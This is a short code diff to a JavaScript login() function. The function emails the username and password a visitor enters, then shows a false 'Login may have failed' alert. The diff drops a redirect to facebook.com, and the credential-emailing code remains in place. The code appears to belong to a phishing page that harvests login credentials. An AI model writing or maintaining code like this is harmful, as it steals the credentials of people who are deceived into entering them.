@@ -121,9 +121,7 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value()
   }).then(
-    createCustomAlert('Login may have failed'));
-    window.location.replace("http://facebook.com");
-  
+    createCustomAlert('Login may have failed'));  
 
 }
 
